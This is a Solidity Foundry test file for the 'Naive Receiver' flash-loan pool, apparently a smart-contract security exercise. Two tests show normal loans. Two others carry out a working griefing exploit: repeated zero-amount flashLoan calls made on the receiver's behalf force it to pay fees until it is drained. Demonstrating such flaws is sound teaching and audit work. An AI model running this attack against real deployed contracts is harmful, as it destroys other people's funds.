pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/exchange/ERC20Mint.sol";
import "../../src/naive-receiver/NaiveReceiver.sol";

contract NaiveReceiverTest is Test {
    ERC20Mint public token;
    NaiveReceiverLenderPool public pool;
    FlashLoanReceiver public receiver;

    address public User = address(0x1234);
    address public attacker = address(0x5678);

    uint256 constant TOKENS_IN_POOL = 1000 ether;
    uint256 constant TOKENS_IN_RECEIVER = 10 ether;
    uint256 constant FIXED_FEE = 1 ether;

    function setUp() public {
        token = new ERC20Mint("Test Token", "TEST");
        pool = new NaiveReceiverLenderPool(address(token));
        receiver = new FlashLoanReceiver(address(pool));

        token.mint(address(pool), TOKENS_IN_POOL);
        token.mint(address(receiver), TOKENS_IN_RECEIVER);
        token.mint(User, 100 ether);
    }

    function test_NormalExecution_ReceiverRequestsLoan() public {
        console.log("Scenario: Receiver legitmately request a flashloan");

        uint256 receiverBefore = token.balanceOf(address(receiver));
        uint256 poolBefore = token.balanceOf(address(pool));

        console.log("- Receiver balance:", receiverBefore);
        console.log("- Pool balance: ", poolBefore);

        vm.prank(address(receiver));
        pool.flashLoan(address(receiver), 100 ether);

        uint256 receiverAfter = token.balanceOf(address(receiver));
        uint256 poolAfter = token.balanceOf(address(pool));

        console.log("- Receiver balance:", receiverAfter);
        console.log("- Pool balance:    ", poolAfter);
        console.log("- Fee paid:        ", FIXED_FEE);

        assertEq(receiverAfter, receiverBefore - FIXED_FEE);

        assertEq(poolAfter, poolBefore + FIXED_FEE);

        console.log("Normal flashloan executed successfully");
    }

    function test_NormalExecution_ReceiverUsesLoan() public {
        uint256 loanAmount = 500 ether;
        uint256 receiverBefore = token.balanceOf(address(receiver));

        console.log("Receiver requests loan of:", loanAmount / 1 ether, "tokens");
        console.log("Receiver balance before: ", receiverBefore / 1 ether, "tokens");

        pool.flashLoan(address(receiver), loanAmount);

        uint256 receiverAfter = token.balanceOf(address(receiver));

        console.log("Receiver balance after:  ", receiverAfter / 1 ether, "tokens");
        console.log("Fee paid:                ", FIXED_FEE / 1 ether, "token");

        assertEq(receiverAfter, receiverBefore - FIXED_FEE);

        console.log("Receiver used", loanAmount / 1 ether, "tokens and only paid 1 token fee");
    }

    function test_VulnerableExecution_AnyoneCanCallOnBehalfOfReceiver() public {
        console.log("Scenario: Attacker calls flashLoan on behalf of receiver");

        uint256 receiverBefore = token.balanceOf(address(receiver));
        uint256 attackerBefore = token.balanceOf(attacker);

        console.log("BEFORE:");
        console.log("- Receiver balance:", receiverBefore);
        console.log("- Attacker balance:", attackerBefore);

        vm.prank(attacker);
        pool.flashLoan(address(receiver), 0);

        uint256 receiverAfter = token.balanceOf(address(receiver));
        uint256 attackerAfter = token.balanceOf(attacker);

        console.log("AFTER:");
        console.log("- Receiver balance:", receiverAfter);
        console.log("- Attacker balance:", attackerAfter);

        // Receiver paid the fee (not the attacker!)
        assertEq(receiverAfter, receiverBefore - FIXED_FEE);

        // Attacker didn't pay anything!
        assertEq(attackerAfter, attackerBefore);

        console.log("VULNERABILITY: Attacker forced receiver to pay fee!");
        console.log("   Attacker cost: 0 tokens (just gas)");
        console.log("   Receiver lost: 1 token");
    }

    function test_VulnerableExecution_AttackerDrainsReceiver() public {
        console.log("\n=== VULNERABLE EXECUTION - Complete Drain ===");
        console.log("Scenario: Attacker drains receiver by calling flashLoan 10 times\n");

        uint256 receiverBefore = token.balanceOf(address(receiver));
        uint256 poolBefore = token.balanceOf(address(pool));

        console.log("BEFORE ATTACK:");
        console.log("- Receiver balance:", receiverBefore);
        console.log("- Pool balance:    ", poolBefore);
        console.log("- Attacker balance:", token.balanceOf(attacker));

        console.log("\nEXECUTING ATTACK...");

        vm.startPrank(attacker);

        // Attacker calls flashLoan 10 times on behalf of receiver
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 0);
            console.log("  Attack", i + 1, "- Receiver balance:", token.balanceOf(address(receiver)));
        }

        vm.stopPrank();

        uint256 receiverAfter = token.balanceOf(address(receiver));
        uint256 poolAfter = token.balanceOf(address(pool));

        console.log("\nAFTER ATTACK:");
        console.log("- Receiver balance:", receiverAfter);
        console.log("- Pool balance:    ", poolAfter);
        console.log("- Attacker balance:", token.balanceOf(attacker));

        // Receiver is completely drained!
        assertEq(receiverAfter, 0);

        // Pool gained all receiver's tokens
        assertEq(poolAfter, poolBefore + receiverBefore);

        // Attacker didn't gain tokens (but successfully griefed receiver)
        assertEq(token.balanceOf(attacker), 0);

        console.log(" ATTACK SUCCESSFUL!");
        console.log("   Receiver drained: 10 tokens");
        console.log("   Attacker cost: 0 tokens (just gas)");
        console.log("   Pool gained: 10 tokens in fees");
    }
}
